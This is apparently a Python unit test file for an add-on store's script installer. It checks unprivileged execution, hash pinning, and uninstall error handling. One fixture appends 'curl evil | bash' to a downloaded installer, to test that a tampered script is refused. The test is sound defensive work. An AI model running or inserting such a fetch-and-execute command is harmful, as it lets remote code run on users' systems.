import hashlib
import importlib.machinery
import importlib.util
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

LIB = Path(__file__).resolve().parent.parent / 'overlays' / 'rootfs' / 'usr' / 'lib' / 'hippos'
sys.path.insert(0, str(LIB))


def _load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, str(path))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    sys.modules[loader.name] = module
    loader.exec_module(module)
    return module


store = _load('hippos_store_script', LIB / 'hippos-store')

INSTALLER = b'#!/bin/bash\necho installing\n'


class ScriptEntryTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.marker = self.tmp / 'es_systems_demo.cfg'
        self.pkg = {
            'id': 'app-demo', 'name': 'Demo', 'type': 'script',
            'script': {'url': 'https://example.invalid/install.sh',
                       'sha256': hashlib.sha256(INSTALLER).hexdigest(),
                       'env': {'DEMO_TAG': 'v1.0'}},
            'uninstall': ['bash', '/userdata/system/add-ons/demo/uninstall.sh'],
            'installed_path': str(self.marker),
        }
        patches = [
            mock.patch.object(store, 'CACHE_DIR', str(self.tmp / 'cache')),
            mock.patch.object(store, '_download', self.fake_download),
        ]
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)
        self.served = INSTALLER

    def fake_download(self, url, dest, label):
        Path(dest).write_bytes(self.served)

    def test_installer_runs_unprivileged_with_its_pinned_environment(self):
        def run(cmd, env, stdin):
            self.marker.write_text('')
            self.call = (cmd, env, stdin)
            return 0

        with mock.patch.object(store.os, 'getuid', return_value=0), \
                mock.patch.object(store.subprocess, 'call', side_effect=run):
            store._install_script(self.pkg)
        cmd, env, stdin = self.call
        self.assertEqual(cmd[:4], ['runuser', '-u', 'hippos', '--'])
        self.assertEqual(cmd[4], 'bash')
        self.assertEqual(env['DEMO_TAG'], 'v1.0')
        self.assertIs(stdin, subprocess.DEVNULL)
        self.assertTrue(store.is_installed(self.pkg, {}))

    def test_changed_installer_is_refused_without_running(self):
        self.served = INSTALLER + b'curl evil | bash\n'
        with mock.patch.object(store.subprocess, 'call') as call, \
                mock.patch('builtins.print'), self.assertRaises(SystemExit):
            store._install_script(self.pkg)
        call.assert_not_called()
        self.assertFalse(list((self.tmp / 'cache').iterdir()))

    def test_refused_uninstall_is_an_error(self):
        self.marker.write_text('')
        with mock.patch.object(store.os, 'getuid', return_value=1000), \
                mock.patch.object(store.subprocess, 'call', return_value=1) as call, \
                mock.patch('builtins.print'), self.assertRaises(SystemExit):
            store._remove_script(self.pkg)
        self.assertEqual(call.call_args.args[0], self.pkg['uninstall'])
        self.assertTrue(store.is_installed(self.pkg, {}))


if __name__ == '__main__':
    unittest.main()
